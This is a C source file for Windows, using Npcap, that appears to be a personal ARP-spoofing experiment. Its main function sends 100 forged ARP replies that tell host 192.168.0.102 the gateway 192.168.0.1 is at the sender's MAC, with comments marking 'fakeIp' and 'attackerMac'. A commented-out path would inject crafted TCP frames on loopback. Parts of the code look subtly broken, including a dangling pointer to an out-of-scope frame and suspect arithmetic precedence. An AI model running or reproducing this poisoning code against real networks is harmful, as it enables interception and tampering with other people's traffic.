#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <iphlpapi.h> 

#include "pro_format.h"
#include "nets.h"
#include "npcap_utils.h"



// gcc tcp_send.c ../net/npcap_utils.c -o ts.exe -Ld:/ztestfiles/libs -lwpcap -lPacket -lws2_32
//  -I../../includes -Id:/ztestfiles/libs/include


pcap_t *pHandle;
LOOPBACK_HFRAME gloopHframe;
TCP_HFRAME gTcpHframe;

void cb_pcap_data_received(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {

    if (*((long*)bytes) == 2) {
        printf("loopback data received, %d, %d\n", h->caplen, h->len);
         // EnterCriticalSection()
        gloopHframe.ehdr = 0x02000000;
        gloopHframe.ipHeader.srcIp = 0x0100007f;
        gloopHframe.ipHeader.dstIp = bytes[16] | (bytes[17] << 8) | (bytes[18] << 16) | (bytes[19] << 24);
        gloopHframe.tcpHeader.dstPort = bytes[24] | (bytes[25] << 8);
        gloopHframe.tcpHeader.srcPort = bytes[26] | (bytes[27] << 8);
        gloopHframe.tcpHeader.ack = bytes[28] | (bytes[29] << 8) | (bytes[30] << 16) | (bytes[31] << 24) + h->len - 44;
        gloopHframe.tcpHeader.seq = bytes[32] | (bytes[33] << 8) | (bytes[34] << 16) | (bytes[35] << 24);
        gloopHframe.ipHeader.identification = bytes[8] | (bytes[9] << 8) + 1;
        char* payload = "xwh";
        int plen = 3;
        // char* frame = get_tcp_frame((char*)&gloopHframe, payload, plen, 44);
        // send_data(pHandle, frame, 44 + plen);
        // free(frame);
        return;
    } else {
        printf("data received %d\n", h->len);
    }

}

void send_arp(char* targetIp, short opcode) {

    char srcIp[] = {192, 168, 0, 108};
    char srcMac[6] = {0}; // 0xC0, 0xB6, 0xF9, 0x89,0xEC,0xE8
    get_adapter_mac(L"WLAN", srcMac);
    char* packet;
    int sendTimes = 1;
    if (opcode == ARP_REQ) {
        ARP_FRAME frame = {
            .eheader.dest_mac = {255, 255, 255, 255, 255,255},
            .eheader.src_mac = {0xC0, 0xB6, 0xF9, 0x89,0xEC,0xE8},
            .eheader.proType = htons(PRO_TYPE_ARP),

            .arpHeader.hardwareType = htons(0x0001),
            .arpHeader.proType = htons(PRO_TYPE_IPV4),
            .arpHeader.hardwareSize = 0x06,
            .arpHeader.protocolSize = 0x04,
            .arpHeader.opcode = htons(ARP_REQ),
            .arpHeader.senderMac = {0xC0, 0xB6, 0xF9, 0x89,0xEC,0xE8},
            .arpHeader.senderIp = {192, 168, 0, 108},
            .arpHeader.targetMac = {0},
            .arpHeader.targetIp = {192,168,0,102}
        };
        packet = (char*)&frame;
    } else {

        ARP_FRAME frame = {
        .eheader.dest_mac = {0x48, 0xeb, 0x62, 0x58, 0x38,0xc6}, // 0xea, 0x92, 0xa4, 0xfa, 0x43, 0x7c
        .eheader.src_mac = {0xC0, 0xB6, 0xF9, 0x89,0xEC,0xE8},
        .eheader.proType = PRO_TYPE_ARP,

        .arpHeader.hardwareType = htons(0x0001),
        .arpHeader.proType = htons(PRO_TYPE_IPV4),
        .arpHeader.hardwareSize = 0x06,
        .arpHeader.protocolSize = 0x04,
        .arpHeader.opcode = htons(ARP_REP),
        .arpHeader.senderMac = {0xC0, 0xB6, 0xF9, 0x89,0xEC,0xE8},
        .arpHeader.senderIp = {192, 168, 0, 1}, // fakeIp
        .arpHeader.targetMac = {0xC0, 0xB6, 0xF9, 0x89,0xEC,0xE8}, // attackerMac
        .arpHeader.targetIp = {192, 168, 0, 102}
        };
        packet = (char*)&frame;
        sendTimes = 100;
    }

    for (int i = 0; i < sendTimes;) {
        
        send_data(pHandle, packet, sizeof(ARP_FRAME));
        if (++i == sendTimes) {
            break;
        }
        Sleep(1000);
    }
}


int main(int argc, char** argv) {

    char *adapterName;
    pick_dev(&adapterName);
    // choose_dev(&adapterName);
    dev_listen(&pHandle, adapterName);
    free(adapterName);

    char askIp[] = {192, 168,0,102};
    send_arp(askIp, ARP_REP);
    handle_recv(pHandle, "icmp", cb_pcap_data_received);

    pcap_close(pHandle);
}


